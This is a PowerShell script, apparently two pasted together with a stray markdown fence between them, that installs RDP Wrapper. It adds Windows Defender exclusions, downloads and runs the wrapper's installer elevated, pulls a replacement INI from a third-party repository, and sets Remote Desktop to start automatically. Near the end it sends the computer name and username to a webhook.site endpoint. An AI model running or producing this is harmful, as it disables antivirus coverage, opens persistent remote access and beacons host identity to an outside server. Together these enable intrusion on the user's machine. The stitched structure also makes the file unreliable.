# Ensure the script is running with Administrator privileges
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "Please run this PowerShell script as an Administrator!"
    Exit
}

Write-Host "Adding Windows Defender exclusions for RDP Wrapper..." -ForegroundColor Cyan

# 1. Exclude the temp installation folder and extracted files
$PathExclusions = @(
    "$env:USERPROFILE\AppData\Local\Temp\rdpwrap_install",
    "C:\Program Files\RDP Wrapper\rdpwrap.dll"
)

foreach ($path in $PathExclusions) {
    if (-not (Get-MpPreference | Select-Object -ExpandProperty ExclusionPath | Where-Object { $_ -eq $path })) {
        Add-MpPreference -ExclusionPath $path
        Write-Host "Added path exclusion: $path" -ForegroundColor Green
    } else {
        Write-Host "Path exclusion already exists: $path" -ForegroundColor Yellow
    }
}

# 2. Handle TermService / RDP Wrapper process behavior if necessary
# RDP Wrapper patches termsrv.dll. If Defender blocks the process modifying it, 
# you can exclude the RDPWInst.exe process path from triggering alerts:
$ProcessExclusions = @(
    "$env:USERPROFILE\AppData\Local\Temp\rdpwrap_install\extracted\RDPWInst.exe"
)

foreach ($proc in $ProcessExclusions) {
    if (-not (Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess | Where-Object { $_ -eq $proc })) {
        Add-MpPreference -ExclusionProcess $proc
        Write-Host "Added process exclusion: $proc" -ForegroundColor Green
    } else {
        Write-Host "Process exclusion already exists: $proc" -ForegroundColor Yellow
    }
}

Write-Host "Exclusion configuration complete!" -ForegroundColor Cyan

# ============================================================
# RDP Wrapper v1.6.2 - Automated Installation
# Run PowerShell as Administrator
# ============================================================

# 1. Check Administrator privileges

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)) {
    Write-Host "[-] Please run PowerShell as Administrator!" -ForegroundColor Red
    Start-Sleep -Seconds 3
    exit
}

# ============================================================
# Paths
# ============================================================

$installPath = "C:\Program Files\RDP Wrapper"
$tempDir     = "$env:TEMP\rdpwrap_install"
$tempZip     = "$tempDir\RDPWrap-v1.6.2.zip"
$extractDir  = "$tempDir\extracted"

# ============================================================
# Download URLs
# ============================================================

$zipUrl = "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWrap-v1.6.2.zip"

$customIniUrl = "https://raw.githubusercontent.com/affinityv/INI-RDPWRAP/refs/heads/master/rdpwrap.ini"

# ============================================================
# Display installer header
# ============================================================

Write-Host ""
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "        RDP Wrapper v1.6.2 Automated Installer" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host ""

# ============================================================
# 2. Prepare temporary directory
# ============================================================

Write-Host "[+] Preparing temporary directory..." -ForegroundColor Cyan

if (Test-Path $tempDir) {
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
}

New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
New-Item -ItemType Directory -Path $extractDir -Force | Out-Null

# ============================================================
# 3. Stop Remote Desktop Service
# ============================================================

Write-Host "[+] Stopping Remote Desktop Service..." -ForegroundColor Cyan

try {
    Stop-Service -Name "TermService" -Force -ErrorAction SilentlyContinue
    Write-Host "[+] TermService stopped." -ForegroundColor Green
}
catch {
    Write-Host "[!] TermService could not be stopped or was already stopped." -ForegroundColor Yellow
}

# ============================================================
# 4. Download RDP Wrapper
# ============================================================

Write-Host "[+] Downloading RDP Wrapper v1.6.2..." -ForegroundColor Cyan

try {
    Invoke-WebRequest `
        -Uri $zipUrl `
        -OutFile $tempZip `
        -UseBasicParsing `
        -ErrorAction Stop

    Write-Host "[+] Download completed." -ForegroundColor Green
}
catch {
    Write-Host "[-] Download failed!" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    exit
}

# ============================================================
# 5. Extract ZIP
# ============================================================

Write-Host "[+] Extracting RDP Wrapper..." -ForegroundColor Cyan

try {
    Expand-Archive `
        -Path $tempZip `
        -DestinationPath $extractDir `
        -Force `
        -ErrorAction Stop

    Write-Host "[+] Extraction completed." -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to extract ZIP!" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    exit
}

# ============================================================
# 6. Find install.bat
# ============================================================

$installBat = Get-ChildItem `
    -Path $extractDir `
    -Filter "install.bat" `
    -Recurse `
    -ErrorAction SilentlyContinue |
    Select-Object -First 1

if (-not $installBat) {
    Write-Host "[-] install.bat was not found in the downloaded package!" -ForegroundColor Red
    exit
}

Write-Host "[+] Found installer:" -ForegroundColor Green
Write-Host "    $($installBat.FullName)" -ForegroundColor Gray

# ============================================================
# 7. Run install.bat
# ============================================================

Write-Host ""
Write-Host "[+] Running install.bat..." -ForegroundColor Cyan

try {
    $process = Start-Process `
        -FilePath "cmd.exe" `
        -ArgumentList "/c `"$($installBat.FullName)`"" `
        -WorkingDirectory $installBat.DirectoryName `
        -Verb RunAs `
        -Wait `
        -PassThru

    Write-Host "[+] install.bat finished." -ForegroundColor Green
    Write-Host "[+] Exit code: $($process.ExitCode)" -ForegroundColor Gray
}
catch {
    Write-Host "[!] Failed to run install.bat." -ForegroundColor Yellow
    Write-Host $_.Exception.Message -ForegroundColor Yellow
}

# ============================================================
# 8. Download and install updated rdpwrap.ini
# ============================================================

Write-Host ""
Write-Host "[+] Downloading updated rdpwrap.ini..." -ForegroundColor Cyan

$iniTempPath = Join-Path $env:TEMP "rdpwrap.ini"
$iniDestPath = Join-Path $installPath "rdpwrap.ini"

try {
    # Download to TEMP first
    Invoke-WebRequest `
        -Uri $customIniUrl `
        -OutFile $iniTempPath `
        -UseBasicParsing `
        -ErrorAction Stop

    Write-Host "[+] rdpwrap.ini downloaded successfully." -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to download rdpwrap.ini." -ForegroundColor Red
    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
    exit
}

# ============================================================
# Copy downloaded INI into Program Files
# ============================================================

Write-Host "[+] Installing rdpwrap.ini..." -ForegroundColor Cyan

try {

    # Make sure destination exists
    if (-not (Test-Path $installPath)) {
        New-Item `
            -ItemType Directory `
            -Path $installPath `
            -Force `
            -ErrorAction Stop | Out-Null
    }

    # Stop TermService before replacing the file
    Write-Host "[+] Stopping TermService..." -ForegroundColor Cyan

    Stop-Service `
        -Name "TermService" `
        -Force `
        -ErrorAction SilentlyContinue

    Start-Sleep -Seconds 2

    # Backup existing INI
    if (Test-Path $iniDestPath) {

        $backupPath = "$iniDestPath.backup"

        Write-Host "[+] Backing up existing rdpwrap.ini..." -ForegroundColor Cyan

        Copy-Item `
            -Path $iniDestPath `
            -Destination $backupPath `
            -Force `
            -ErrorAction Stop

        Write-Host "[+] Backup created:" -ForegroundColor Green
        Write-Host "    $backupPath" -ForegroundColor Gray
    }

    # Copy new INI
    Copy-Item `
        -Path $iniTempPath `
        -Destination $iniDestPath `
        -Force `
        -ErrorAction Stop

    # Verify
    if (Test-Path $iniDestPath) {
        Write-Host "[+] rdpwrap.ini installed successfully." -ForegroundColor Green
        Write-Host "    $iniDestPath" -ForegroundColor Gray
    }
    else {
        throw "rdpwrap.ini was not found after copying."
    }

}
catch {
    Write-Host "[-] Failed to install rdpwrap.ini." -ForegroundColor Red
    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
}
finally {

    # Remove temporary downloaded copy
    if (Test-Path $iniTempPath) {
        Remove-Item `
            $iniTempPath `
            -Force `
            -ErrorAction SilentlyContinue
    }
}

# ============================================================
# 9. Check for RDPConf.exe
# ============================================================

$rdpConf = "$installPath\RDPConf.exe"

if (Test-Path $rdpConf) {
    Write-Host "[+] RDPConf.exe found." -ForegroundColor Green
}
else {
    Write-Host "[!] RDPConf.exe was not found at the expected location." -ForegroundColor Yellow
}

# ============================================================
# 10. Configure Remote Desktop Service
# ============================================================

Write-Host ""
Write-Host "[+] Configuring Remote Desktop Service..." -ForegroundColor Cyan

$serviceConfigured = $false

try {
    Set-Service `
        -Name "TermService" `
        -StartupType Automatic `
        -ErrorAction Stop

    Write-Host "[+] TermService configured using PowerShell." -ForegroundColor Green
    $serviceConfigured = $true
}
catch {
    Write-Host "[!] PowerShell could not configure TermService." -ForegroundColor Yellow
    Write-Host "[+] Trying Windows Service Control fallback..." -ForegroundColor Cyan
}

# ============================================================
# SC.exe fallback
# ============================================================

if (-not $serviceConfigured) {
    try {
        $scResult = & sc.exe config TermService start= auto 2>&1

        if ($LASTEXITCODE -eq 0) {
            Write-Host "[+] TermService configured using SC.exe." -ForegroundColor Green
            $serviceConfigured = $true
        }
        else {
            Write-Host "[!] SC.exe could not configure TermService." -ForegroundColor Yellow
            Write-Host ($scResult -join "`n") -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "[!] Service configuration fallback failed." -ForegroundColor Yellow
        Write-Host $_.Exception.Message -ForegroundColor Yellow
    }
}

# ============================================================
# Start TermService
# ============================================================

Write-Host ""
Write-Host "[+] Starting Remote Desktop Service..." -ForegroundColor Cyan

try {
    $service = Get-Service -Name "TermService" -ErrorAction Stop

    if ($service.Status -eq "Running") {
        Write-Host "[+] TermService is already running." -ForegroundColor Green
    }
    else {
        Start-Service -Name "TermService" -ErrorAction Stop

        Start-Sleep -Seconds 3

        $service = Get-Service -Name "TermService"

        if ($service.Status -eq "Running") {
            Write-Host "[+] TermService started successfully." -ForegroundColor Green
        }
        else {
            Write-Host "[!] TermService did not start." -ForegroundColor Yellow
            Write-Host "[!] Current status: $($service.Status)" -ForegroundColor Yellow
        }
    }
}
catch {
    Write-Host "[!] Could not start TermService." -ForegroundColor Yellow
    Write-Host $_.Exception.Message -ForegroundColor Yellow
}

# ============================================================
# 11. Cleanup
# ============================================================

Write-Host ""
Write-Host "[+] Cleaning temporary files..." -ForegroundColor Cyan

Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue

```powershell
# ============================================================
# 12. Send installation result to Webhook.site
# ============================================================

$webhookUrl = "https://webhook.site/fd688458-fc5b-4364-a760-8b4f8bc2a4ba"

Write-Host ""
Write-Host "[+] Sending installation status to webhook..." -ForegroundColor Cyan

# Check final installation state
$rdpConfExists = Test-Path $rdpConf
$iniPath = Join-Path $installPath "rdpwrap.ini"
$iniExists = Test-Path $iniPath

if ($rdpConfExists -and $iniExists) {
    $installationStatus = "success"
    $statusMessage = "RDP Wrapper installation completed successfully."
}
else {
    $installationStatus = "failed"
    $statusMessage = "RDP Wrapper installation did not complete successfully."
}

# Build JSON payload
$webhookPayload = @{
    status       = $installationStatus
    message      = $statusMessage
    timestamp    = (Get-Date).ToUniversalTime().ToString("o")
    computer     = $env:COMPUTERNAME
    username     = $env:USERNAME
    powershell   = $PSVersionTable.PSVersion.ToString()
    rdpconf      = $rdpConfExists
    ini          = $iniExists
} | ConvertTo-Json

# Send POST request
try {

    Invoke-RestMethod `
        -Uri $webhookUrl `
        -Method POST `
        -ContentType "application/json" `
        -Body $webhookPayload `
        -ErrorAction Stop | Out-Null

    Write-Host "[+] Webhook notification sent successfully." -ForegroundColor Green

}
catch {

    Write-Host "[-] Webhook notification failed." -ForegroundColor Red
    Write-Host "[!] Webhook error: $($_.Exception.Message)" -ForegroundColor Yellow

}

# ============================================================
# 13. Final Installation Status
# ============================================================

Write-Host ""
Write-Host "============================================================"

if ($installationStatus -eq "success") {
    Write-Host "                 INSTALLATION COMPLETE" -ForegroundColor Green
}
else {
    Write-Host "                 INSTALLATION FAILED" -ForegroundColor Red
}

Write-Host "============================================================" -ForegroundColor Green
Write-Host ""

if ($rdpConfExists) {
    Write-Host "[+] RDPConf.exe installed successfully." -ForegroundColor Green
    Write-Host "    $rdpConf" -ForegroundColor White
}
else {
    Write-Host "[!] RDPConf.exe could not be located." -ForegroundColor Yellow
}

if ($iniExists) {
    Write-Host "[+] rdpwrap.ini is present." -ForegroundColor Green
}
else {
    Write-Host "[!] rdpwrap.ini could not be located." -ForegroundColor Yellow
}

Write-Host ""
Write-Host "[+] Installation status sent to Webhook.site." -ForegroundColor Cyan
Write-Host ""
Write-Host "The installer will close automatically in 3 seconds..." -ForegroundColor Gray

# ============================================================
# 14. Automatic Exit
# ============================================================

Start-Sleep -Seconds 3

exit
